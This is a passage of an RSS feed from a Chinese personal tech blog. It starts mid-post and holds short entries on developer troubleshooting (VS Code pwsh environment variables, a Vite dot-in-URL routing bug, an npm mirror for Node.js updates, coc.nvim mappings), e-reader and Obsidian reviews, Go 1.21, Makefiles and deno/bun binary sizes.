&lt;p&gt;一个50多岁的人，人生过了大半。面对现在飞速发展的社会，很多东西都已经无法适应。对于他自己来说，也基本上无法改变自己。从第七次人口普查的数据中可以看出，在2020年60+的人口已经占比接近14亿人口的20%了，随着时间的推移，这个占比只会增大。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2023/the-cell/atta/2023-11-22-21-27-50.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;对于我爸这类的人，即使刷的眼睛疼，也无法控制自己，还是一直不停的刷。&lt;/p&gt;
&lt;p&gt;由此可见，像这种大公司，制作的超级App有多可怕。能够一直持续的让大脑保持短期兴奋。这种超级App，背后都是心理学家、计算机学家、数据科学家等。 这些专家对待普通大众，就像哥伦布对待印第安人。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;因为我发现他们没有什么信仰，也没有任何崇拜的形象，人们又都很温和，他们无邪得不知道什么是邪恶，从不侵害别人，也不懂得偷窃，没有打斗，特别的温顺  《哥伦布日记》&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;或许几十年以后，大部分人的大脑已经退化，也不需要有思考能里。只需要机械的按照刺激-&amp;gt;反应去行动。&lt;/p&gt;
&lt;p&gt;这种进化是一种潮流，绝大多数人都难以幸免。作为一个独立思考的人，我只能尽量避免被影响，远离社交网络。&lt;/p&gt;</description>
    </item>
    <item>
      <title>解决 VsCode pwsh终端环境变量不生效问题</title>
      <link>https://wdd.js.org/posts/2023/vscode-pwsh-env-not-work/</link>
      <pubDate>Thu, 16 Nov 2023 08:08:39 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/vscode-pwsh-env-not-work/</guid>
      <description>&lt;p&gt;我在系统的环境变量设置里，用户和系统中，都加入了&lt;code&gt;ELECTRON_MIRROR=https://npmmirror.com/mirrors/electron/&lt;/code&gt;这个环境变量。&lt;/p&gt;
&lt;p&gt;单独打开windows Terminal应用，使用 &lt;code&gt;env | grep ELE&lt;/code&gt; 是能搜到我设置的环境变量的。但是在vscode中，这个环境变量不存在。&lt;/p&gt;
&lt;p&gt;我尝试了以下几个方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;重启电脑，无效&lt;/li&gt;
&lt;li&gt;配置&lt;code&gt;&amp;quot;terminal.integrated.persistentSessionReviveProcess&amp;quot;: &amp;quot;never&amp;quot;&lt;/code&gt;, 然后重启电脑，无效&lt;/li&gt;
&lt;li&gt;在终端直接执行&lt;code&gt;code .&lt;/code&gt;, 在终端打开vscode, 依然无效&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因此，我想起了之前配置的pwsh的配置文件。 可以使用&lt;code&gt;code $PROFILE&lt;/code&gt;, 打开pwsh的配置文件。&lt;/p&gt;
&lt;p&gt;然后再配置文件中设置环境变量， 之后重启vscode, 环境变量就正常能读取到了。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 文件名 Microsoft.PowerShell_profile.ps1
$env:ELECTRON_MIRROR=&amp;#34;https://npmmirror.com/mirrors/electron/&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.zhihu.com/question/266858097&#34;&gt;https://www.zhihu.com/question/266858097&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Vite React Route URL含有.时，路径无法正常匹配</title>
      <link>https://wdd.js.org/posts/2023/vite-react-route-url-dot-404/</link>
      <pubDate>Thu, 09 Nov 2023 20:49:44 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/vite-react-route-url-dot-404/</guid>
      <description>&lt;p&gt;今天遇到一个奇怪的问题，react-router的路径匹配无法正常工作，反而向vite的dev server发送了GET请求，这个请求报错404。页面直接无法访问。&lt;/p&gt;
&lt;p&gt;按理说这种前端路由的框架应该不需要向后段发送请求的。&lt;/p&gt;
&lt;p&gt;后来我怀疑是不是代理的问题，但是只是部分页面无法访问，所以排出这个选项。&lt;/p&gt;
&lt;p&gt;随后我的系统又收到一条测试数据，这条测试数据却能够正常跳转。&lt;/p&gt;
&lt;p&gt;我仔细的对别了两个不同的url，发现有问题的那个url包含了一个英文字符&lt;code&gt;.&lt;/code&gt;,  所以我怀疑是react-router的路径匹配有问题。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/call/2023-11-09/nlLBs32pp.2oXhnY6xzmYBCnjhYUkc7Z
/call/2023-11-09/fYqZKTGHBFVCz4iC5irulFc83giH9bsa	
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我的第一反应是react-router对于动态的路径，是有字符要求的。翻阅官方文档后，没有发现类似的描述。&lt;/p&gt;
&lt;p&gt;然后我在react-router的issue列表上查找有没有人提出类似的问题，发现了 &lt;a href=&#34;https://github.com/remix-run/react-router/issues/8389&#34;&gt;[Bug]: paths with dynamic parameters do not work correctly when there is a dot in the url&lt;/a&gt;,&lt;/p&gt;
&lt;p&gt;紧接着有人分析，说这个问题并不是react-router上的，而是出在vite上。 vite的项目上也有对应的issue反应这个问题。&lt;/p&gt;
&lt;h1 id=&#34;解决方案&#34;&gt;解决方案&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;方案1: 升级vite 到5.x， 由于当前稳定的还是4.x的vite, 所以这个方案改动太大，放弃&lt;/li&gt;
&lt;li&gt;方案2: 在匹配路径最后加上&lt;code&gt;/&lt;/code&gt;, 也就是原本的&lt;code&gt;/a.b&lt;/code&gt;要改成&lt;code&gt;/a.b/&lt;/code&gt;, 我试了这个方案，是有效的。&lt;/li&gt;
&lt;li&gt;方案3: 使用这个专门用来解决这个问题的插件， &lt;a href=&#34;https://github.com/ivesia/vite-plugin-rewrite-all&#34;&gt;https://github.com/ivesia/vite-plugin-rewrite-all&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;深入分析&#34;&gt;深入分析&lt;/h1&gt;
&lt;p&gt;路径带有点，一般可能认为是一个静态资源，例如&lt;code&gt;a.js, b.css&lt;/code&gt;之类的，所以vite会把符合这个模式的路径直接向后段发送请求，去获取静态资源，而不是去匹配一个组件。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/remix-run/react-router/issues/8389&#34;&gt;https://github.com/remix-run/react-router/issues/8389&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/vitejs/vite/issues/2415&#34;&gt;https://github.com/vitejs/vite/issues/2415&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/vitejs/vite/issues/11282&#34;&gt;https://github.com/vitejs/vite/issues/11282&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/vitejs/vite/issues/2628&#34;&gt;https://github.com/vitejs/vite/issues/2628&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/vitejs/vite/pull/2191/files&#34;&gt;https://github.com/vitejs/vite/pull/2191/files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/bripkens/connect-history-api-fallback&#34;&gt;https://github.com/bripkens/connect-history-api-fallback&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>如何选择，汉王Clear7与文石Leaf3</title>
      <link>https://wdd.js.org/posts/2023/hanvon-clear7-vs-book-leaf3/</link>
      <pubDate>Mon, 06 Nov 2023 09:30:34 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/hanvon-clear7-vs-book-leaf3/</guid>
      <description>&lt;h1 id=&#34;购买选择&#34;&gt;购买选择&lt;/h1&gt;
&lt;p&gt;我的kindle pw4已经用了快三年了，机器性能有些不足，电池也有些不够用了。正逢双十一之际，我觉得可以买一个开放系统的电纸书来用用。&lt;/p&gt;
&lt;p&gt;买开放系统的另一个原因是自从亚马逊退出中国后，我用微信读书比较多，也买了微信读书的会员。&lt;/p&gt;
&lt;p&gt;开放系统基本上都是基于安卓系统定制的，可以选择的厂商比较多。&lt;/p&gt;
&lt;p&gt;最终筛选下来，我选择了汉王clear7和文石leaf3， 我下单了两个，觉得先体验一下，然后在退一个。&lt;/p&gt;
&lt;p&gt;然而用了不到两天之后，我还是决定把两个机器都给退了，继续用我的kindle pw4。&lt;/p&gt;
&lt;h1 id=&#34;选择因素&#34;&gt;选择因素&lt;/h1&gt;
&lt;p&gt;就我个人而言，电子书最为重要的选择因素有以下三点。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;显示效果&lt;/strong&gt;: 说实在的，现在的电子书基本上都是carta1200、300ppi、冷暖光。基本上从显示效果上来说，各大厂家都是半斤八两。就我自己体验而言，我并没有发现汉王的显示效果和文石leaf3有何不同。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;握持手感&lt;/strong&gt;: 外观影响握持手感，外观一般分为两类，一类是就是平板设计，像kindle paperwhite系列。另一类就是书脊式设计，握持更舒适，像kindle os3, 汉王clear7之类的。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;简洁系统&lt;/strong&gt;: 电子书并不是手机，不需要太多的功能，功能太多反而成为累赘&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;稳定性&lt;/strong&gt;: 点子产品难免被摔、或者淋水，对于这些意外情况，如果产品非常脆弱，那么很大可能会损失大笔的金额。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;续航&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;文石的缺点&#34;&gt;文石的缺点&lt;/h1&gt;
&lt;p&gt;文石和汉王的两款产品，拿到手开机不到一小时，我就决定先退了文石。&lt;/p&gt;
&lt;p&gt;原因有以下几点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;显示效果文石和汉王差不多，没啥突出亮点&lt;/li&gt;
&lt;li&gt;握持手感文石肯定比不过汉王的书脊式设计, 并且汉王更轻&lt;/li&gt;
&lt;li&gt;文石的系统太复杂，设置太多，甚至还有个iphone类似的小白点设计，小白点点击之后展开很多图标，每个图标我都不知道做什么的&lt;/li&gt;
&lt;li&gt;掉电速度，文石的电量肉眼可见的在不断减少&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;汉王的缺点&#34;&gt;汉王的缺点&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;微信读书功能阉割, 这不是汉王的问题，而是微信读书自身的问题。例如书架页面，书籍只有一个排序的顺序，就是按照最近阅读的排序。而无法像ios或者安卓app一样能够按照阅读进度排序，另外也没有阅读时长分析的功能。 另外我也注意到，微信读书电纸书版，扫码登录的有效期是24小时，我不知道这是不是意味着24小时之后我又要重新扫码。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;触感光滑，汉王的背板的触感让人感觉非常光滑，感觉稍不注意就会滑下去的样子。完全没有kindle pw4那种拿在手机，就粘在手上的感觉。所以我觉得，买汉王，就必须要买一个保护套，但是官方卖的保护套也太贵了吧，居然要110多块，这点有点像割韭菜。什么保护套能卖那么贵，都快赶上十分之一的电纸书的价格了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;词典缺陷，汉王的词典也是我要吐槽的功能之一，只能把单词的原型加入到单词本，单词来个复数或者过去分词，就不能加入单词本了。kindle的生词本，所有单词，无论什么形式都能加入单词本。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;掉电速度, 从昨晚五点多开机，到今天早上，基本上没到一天，电池已经掉电接近40%了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;自动关机, 为了省电，汉王在2小时不使用后，会自动关机。然而这个开机时间就有点久，你可设想一下，每天早上，你想看书的时候，你都要等几十秒的开机时间，那你能受得了吗？&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;按钮反馈，松松垮垮, 触感没有一致性体验&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;结论&#34;&gt;结论&lt;/h1&gt;
&lt;p&gt;目前而言，国产的电纸书系统，除了开放的系统之外，其他各个方面还是存在与kindle有较大的差距。&lt;/p&gt;
&lt;p&gt;当然，如果你从未使用过kindle系列的产品，国产的电纸书还是值得买的。&lt;/p&gt;</description>
    </item>
    <item>
      <title>没有免费的Obsidian</title>
      <link>https://wdd.js.org/posts/2023/no-free-obsidian/</link>
      <pubDate>Wed, 25 Oct 2023 16:39:10 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/no-free-obsidian/</guid>
      <description>&lt;p&gt;我看过很多介绍obsidian的文章，除了外观漂亮，功能强大，最为着重前调的就是个人用户免费了。&lt;/p&gt;
&lt;p&gt;对于个人用户，真的免费吗？ 还是说人家并不是免费，只是我们在白嫖罢了。&lt;/p&gt;
&lt;p&gt;我们看看官网关于商业付费的详细解释：&lt;/p&gt;
&lt;p&gt;Obsidian 对于个人是免费的。但是，对于那些拥有两名及以上员工的公司或组织，以商业目的使用 Obsidian 的话，则需要购买商用许可证。所谓商业目的，指的是任何与工作相关的活动，比如记录会议内容、项目笔记，或是创建组织 Wiki 等。与这些活动相关的笔记记录、文档管理、知识管理等都可以视为以商用目的使用 Obsidian。 &amp;ndash;参考商用许可证&lt;/p&gt;
&lt;p&gt;所以，大部分人，包括我都是听话一半，只看前面，不看后面的但是。&lt;/p&gt;
&lt;p&gt;对于大部分上班族来说，如果你再用obsidian，我不太相信你从来没有在obsidian里记录一些工作内容。&lt;/p&gt;
&lt;p&gt;对我个人来说，虽然我的有几百条笔记和工作无关。但是也免不了有一些是和工作有关的的。比如对于某个线上问题的分析，比如记录了一些工作账号信息等等。&lt;/p&gt;
&lt;p&gt;在关于商业付费的例子上，官方还举出了贴心的给出了栗子。&lt;/p&gt;
&lt;p&gt;问题5：我使用 Obsidian 储存所有的知识，无论是个人的还是工作/专业相关的（因为太难区分），我需要购买商用许可证吗？&lt;/p&gt;
&lt;p&gt;回答：如果你的笔记中有内容直接与公司项目相关，并且该公司拥有两名及以上员工，那么你需要购买商用许可证。&lt;/p&gt;
&lt;p&gt;综上所述，即使是个人使用，免费的条件也是极为苛刻的。&lt;/p&gt;
&lt;p&gt;你的笔记不能包含任何商业目的的信息
你可以包含商业目的的信息，但前提是你的公司只有你一个人
假如你是个用Obisian的上班族，我觉得极大的可能你并不符合免费用户的条件。&lt;/p&gt;
&lt;p&gt;或者有一天，当你大学毕业了，进入工作环境，你如果还继续用之前的仓库，那你也不再符合免费用户的条件。&lt;/p&gt;
&lt;p&gt;所以说，不要再逢人就说Obsidian是免费的了。&lt;/p&gt;
&lt;p&gt;Obsidian并不免费，只是我们大部分人都在白嫖罢了。&lt;/p&gt;
&lt;p&gt;我也并不是不愿意花钱，如果要付钱的话，我更想买typeora。&lt;/p&gt;
&lt;p&gt;因为typeora是买断机制，一次性付费89元，终身包用，免费升级，最多可以再三台设备上使用&lt;/p&gt;
&lt;p&gt;Obsidian是订阅机制，每年商业使用要50美元，也就是将近400人民币。&lt;/p&gt;</description>
    </item>
    <item>
      <title>MacBook icloud 同步卡死， 请尝试重启电脑</title>
      <link>https://wdd.js.org/posts/2023/macbook-icloud-sync-stuck/</link>
      <pubDate>Sun, 20 Aug 2023 13:07:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/macbook-icloud-sync-stuck/</guid>
      <description>&lt;h1 id=&#34;环境说明&#34;&gt;环境说明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;MacBook Pro M2&lt;/li&gt;
&lt;li&gt;系统版本 13.4.1&lt;/li&gt;
&lt;li&gt;网络环境为wifi&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;操作步骤&#34;&gt;操作步骤&lt;/h1&gt;
&lt;p&gt;我往icloud的文件夹下，粘贴几个文件夹，文件的内容挺多的，然后finder上显示icloud的状态就一直是处于同步中了。&lt;/p&gt;
&lt;p&gt;等了好久，同步的过程似乎卡住了。&lt;/p&gt;
&lt;p&gt;网上看了一些解决方案，似乎都没啥作用。&lt;/p&gt;
&lt;p&gt;我想起来以前的同样的一次卡顿同步的解决方案：重启电脑&lt;/p&gt;
&lt;p&gt;于是，我重启了一次电脑，再次开机，打开finder, icloud文件状态非常快同步完了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Go1.21发布</title>
      <link>https://wdd.js.org/golang/go1.21/</link>
      <pubDate>Thu, 10 Aug 2023 11:20:47 +0800</pubDate>
      <guid>https://wdd.js.org/golang/go1.21/</guid>
      <description>&lt;p&gt;golang每隔6个月发布一个新的次版本号升级。一般是是2月一个版本，8月一个版本&lt;/p&gt;
&lt;h1 id=&#34;语言层面&#34;&gt;语言层面&lt;/h1&gt;
&lt;h2 id=&#34;增加内置函数&#34;&gt;增加内置函数&lt;/h2&gt;
&lt;h3 id=&#34;min-max&#34;&gt;min() max()&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;参考 &lt;a href=&#34;https://tip.golang.org/ref/spec#Min_and_max&#34;&gt;https://tip.golang.org/ref/spec#Min_and_max&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;The built-in functions min and max compute the smallest—or largest, respectively—value of a fixed number of arguments of ordered types. There must be at least one argument.&lt;/p&gt;
&lt;p&gt;The same type rules as for operators apply: for ordered arguments x and y, min(x, y) is valid if x + y is valid, and the type of min(x, y) is the type of x + y (and similarly for max). If all arguments are constant, the result is constant.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tutorial</title>
      <link>https://wdd.js.org/makefile/tutorial/</link>
      <pubDate>Thu, 10 Aug 2023 09:47:46 +0800</pubDate>
      <guid>https://wdd.js.org/makefile/tutorial/</guid>
      <description>&lt;h1 id=&#34;语法&#34;&gt;语法&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Makefile&#34; data-lang=&#34;Makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;targets&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; prerequisites
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	command
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	command
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	command
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;targets是文件名，可以用空格分开多个文件名，一般情况下，只有一个&lt;/li&gt;
&lt;li&gt;command是一系列的指令，可以多行分开&lt;/li&gt;
&lt;li&gt;prerequisites是依赖项目，可以用空格分开多个&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://makefiletutorial.com/#makefile-cookbook&#34;&gt;https://makefiletutorial.com/#makefile-cookbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>困在coc错误弹窗中</title>
      <link>https://wdd.js.org/vim/stuck-in-error-msgfloat-window/</link>
      <pubDate>Mon, 10 Jul 2023 12:27:47 +0800</pubDate>
      <guid>https://wdd.js.org/vim/stuck-in-error-msgfloat-window/</guid>
      <description>&lt;p&gt;请注意，VIM的光标现在位于错误弹窗上了。光标只能左右移动，无法上线移动。 我的光标被困在了错误提示框中。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/vim/stuck-in-error-msgfloat-window/atta/2023-07-10-12-30-20.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为错误提示只有一行，所以无法上下移动。&lt;/p&gt;
&lt;p&gt;一直以来，我并没有把错误提示框也看成一个窗口，所以我可能多次按了ctrl + w w, 然后光标跳转到了错误提示框上。&lt;/p&gt;
&lt;p&gt;正常的错误提示框，当光标不在关键词上时，错误弹窗会自动关闭的。 但是由于我已经进入了错误弹窗里面。 所以除非按窗口切换的快捷键，我会始终困在这个错误窗口中。&lt;/p&gt;
&lt;p&gt;我觉得，VIM实在是太博大精深了。很多概念性的理解不到位，就会越到很多困难。 这些困难会给人造成极大的挫折感。&lt;/p&gt;
&lt;p&gt;能解决困难，则学到东西。&lt;/p&gt;
&lt;p&gt;否则就只能放弃VIM, 回到VScode的怀抱中。&lt;/p&gt;
&lt;p&gt;但是，我已经习惯了不使用鼠标的快捷编辑方式。&lt;/p&gt;
&lt;p&gt;我只能学会解决并适应VIM， 并且接受VIM的所有挑战。&lt;/p&gt;</description>
    </item>
    <item>
      <title>VIM typescript 跳转到定义</title>
      <link>https://wdd.js.org/vim/typescript-go-to-definition/</link>
      <pubDate>Mon, 10 Jul 2023 09:30:46 +0800</pubDate>
      <guid>https://wdd.js.org/vim/typescript-go-to-definition/</guid>
      <description>&lt;p&gt;在VScode中，可以使用右键来跳转到typescript类型对应的定义，但是用vim的&lt;code&gt;gd&lt;/code&gt;命令却无法正常跳转。&lt;/p&gt;
&lt;p&gt;因为无法正常跳转的这个问题，我差点放弃了vim。&lt;/p&gt;
&lt;p&gt;然而我想别人应该也遇到类似的问题。&lt;/p&gt;
&lt;p&gt;我的neovim本身使用的是coc插件，然后我就再次到看看官方文档，来确定最终有没有解决这个问题的方案。&lt;/p&gt;
&lt;p&gt;功夫不负有心人。&lt;/p&gt;
&lt;p&gt;我发现官方给的例子中，就包括了如何配置跳换的配置。&lt;/p&gt;
&lt;p&gt;首先说明一下，我本身就安装了&lt;code&gt;coc-json coc-tsserver&lt;/code&gt;这两个插件，所以只需要将如下的配置写入init.vim&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34; GoTo code navigation
nmap &amp;lt;silent&amp;gt; gd &amp;lt;Plug&amp;gt;(coc-definition)
nmap &amp;lt;silent&amp;gt; gy &amp;lt;Plug&amp;gt;(coc-type-definition)
nmap &amp;lt;silent&amp;gt; gi &amp;lt;Plug&amp;gt;(coc-implementation)
nmap &amp;lt;silent&amp;gt; gr &amp;lt;Plug&amp;gt;(coc-references)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样的话，在普通模式，按&lt;code&gt;gy&lt;/code&gt;这个快捷键，就能跳转到对应的类型定义，包括某个npm包的里面的类型定义，非常好用。&lt;/p&gt;
&lt;p&gt;亲测有效。&lt;/p&gt;</description>
    </item>
    <item>
      <title>安装NodeJS, N命令似乎卡住了</title>
      <link>https://wdd.js.org/posts/2023/n-stucked/</link>
      <pubDate>Sun, 09 Jul 2023 14:20:45 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/n-stucked/</guid>
      <description>&lt;p&gt;我一般会紧跟着NodeJS官网的最新版，来更新本地的NodeJS版本。&lt;/p&gt;
&lt;p&gt;我的系统是ubuntu 20.4, 我用&lt;a href=&#34;https://github.com/tj/n&#34;&gt;tj/n&lt;/a&gt;这个工具来更新Node。&lt;/p&gt;
&lt;p&gt;但是这一次，这个命令似乎卡住了。&lt;/p&gt;
&lt;p&gt;我排查后发现，是n这个命令在访问https://nodejs.org/dist/index.tab这个地址时，卡住了。&lt;/p&gt;
&lt;p&gt;请求超时，因为默认没有设置超时时长，所以等待了很久才显示超时的报错，表现象上看起来就是卡住了。&lt;/p&gt;
&lt;p&gt;首先我用dig命令查了nodejs.org的dns解析，我发现是正常解析的。&lt;/p&gt;
&lt;p&gt;然后我又用curl对nodejs官网做了一个测试，发现也是请求超时。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -i -m &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; https://nodejs.org
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl: &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;28&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Failed to connect to nodejs.org port &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt; after &lt;span style=&#34;color:#ae81ff&#34;&gt;3854&lt;/span&gt; ms: 连接超时
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样问题就清楚了，然后我就想起来npmirrror上应该有nodejs的镜像。 在查看n这个工具的文档时，我也发现，它是支持设置mirror的。&lt;/p&gt;
&lt;p&gt;其中给的例子用的就是淘宝NPM&lt;/p&gt;
&lt;p&gt;就是设置了一个环境变量。然后执行&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;export N_NODE_MIRROR=https://npmmirror.com/mirrors/node
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是，我发现在命令行里用echo可以打印N_NODE_MIRROR这个变量的值，但是在安装脚本里，还是无法获取设置的这个mirror。&lt;/p&gt;
&lt;p&gt;我想或许和我在执行&lt;code&gt;sudo n lts&lt;/code&gt;时的sudo有关，这个.zshrc在sudo这种管理员模式下是不生效的。普通用户的环境变量也不会继承到sudo执行的环境变量里&lt;/p&gt;
&lt;p&gt;最后，我用&lt;code&gt;sudo -E n lts&lt;/code&gt;, 成功的从npmmirror上更新了nodejs的版本。&lt;/p&gt;
&lt;p&gt;关于curl超时的这个问题，我也给n仓库提出了pull request, &lt;a href=&#34;https://github.com/tj/n/pull/771&#34;&gt;https://github.com/tj/n/pull/771&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>JS运行时构建独立二进制程序比较</title>
      <link>https://wdd.js.org/posts/2023/js-runtime-build-executable/</link>
      <pubDate>Thu, 01 Jun 2023 13:48:00 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/js-runtime-build-executable/</guid>
      <description>&lt;p&gt;很早以前，要运行js，则必须安装nodejs，且没什么办法可以把js直接构建成一个可执行的文件。&lt;/p&gt;
&lt;p&gt;后来出现一个&lt;a href=&#34;https://www.npmjs.com/package/pkg&#34;&gt;pkg&lt;/a&gt;的npm包，可以用来将js打包成可执行的文件。&lt;/p&gt;
&lt;p&gt;我好像用过这个包，但是似乎中间出过一些问题。&lt;/p&gt;
&lt;p&gt;现在是2023年，前端有了新的气象。&lt;/p&gt;
&lt;p&gt;除了nodejs外，还有其他的后来新秀，如&lt;a href=&#34;https://deno.com/&#34;&gt;deno&lt;/a&gt;， 还有最近表火的&lt;a href=&#34;https://bun.sh/&#34;&gt;bun&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;另外nodejs本身也开始支持打包独立二进制文件了，但是需要最新的20.x版本，而且我看了它的使用介绍文档，&lt;a href=&#34;https://nodejs.org/api/single-executable-applications.html&#34;&gt;single-executable-applications&lt;/a&gt;, 看起来是有有点复杂，光一个构建就写了七八步。&lt;/p&gt;
&lt;p&gt;所以今天只比较一些deno和bun的构建出的文件大小。&lt;/p&gt;
&lt;p&gt;准备的js文件内容&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// app.js
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello world&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;deno构建指令: &lt;code&gt;deno compile --output h1 app.js&lt;/code&gt;,  构建产物为h1
bun构建指令: &lt;code&gt;bun build ./app.js --compile --outfile h2&lt;/code&gt;, 构建产物为h2&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-rw-r--r--@ 1 wangduanduan  staff    26B Jun  1 13:34 app.js
-rwxrwxrwx@ 1 wangduanduan  staff    78M Jun  1 13:59 h1
-rwxrwxrwx@ 1 wangduanduan  staff    45M Jun  1 14:01 h2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;源代码为26b字节&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;deno构建相比于源码的倍数: 3152838&lt;/li&gt;
&lt;li&gt;bun构建相比于源码的翻倍: 1804415&lt;/li&gt;
&lt;li&gt;deno构建的可执行文件相比bun翻倍：1.7&lt;/li&gt;
&lt;/ul&gt;
